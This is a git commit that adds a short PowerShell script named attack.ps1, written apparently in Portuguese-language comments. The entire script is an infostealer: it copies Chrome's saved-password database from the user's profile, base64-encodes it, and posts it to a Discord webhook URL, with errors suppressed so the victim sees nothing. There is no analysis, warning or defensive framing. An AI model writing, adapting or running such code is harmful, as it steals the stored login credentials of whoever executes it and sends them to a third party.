8ba1766b49fb9f2479a0e2133ee670f657579eae
gtr67676 <defsw5938@gmail.com>
2025-05-25 23:30:24 +0100

    Create attack.ps1

---
+++ attack.ps1
@@ -0,0 +1,25 @@
+$chromeLoginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+
+if (Test-Path $chromeLoginDataPath) {
+    try {
+        $tempPath = "$env:TEMP\LoginDataCopy"
+        Copy-Item $chromeLoginDataPath $tempPath -Force
+
+        $fileBytes = [System.IO.File]::ReadAllBytes($tempPath)
+        $base64Data = [Convert]::ToBase64String($fileBytes)
+
+        $webhookUrl = "https://discord.com/api/webhooks/1376301491480166553/xPSHdTo8WCePCKODMgLKacH4xuyTfCIvs3sOF97DK-E6dQkEazXO2vG0Q8XXrFrmzRB0"
+
+        $body = @{
+            username = "RubertoBot"
+            content = "Base64 Chrome Login Data:`n$base64Data"
+        }
+
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body
+    }
+    catch {
+        Write-Output "Erro silencioso"
+    }
+} else {
+    Write-Output "Chrome Login Data não encontrado"
+}
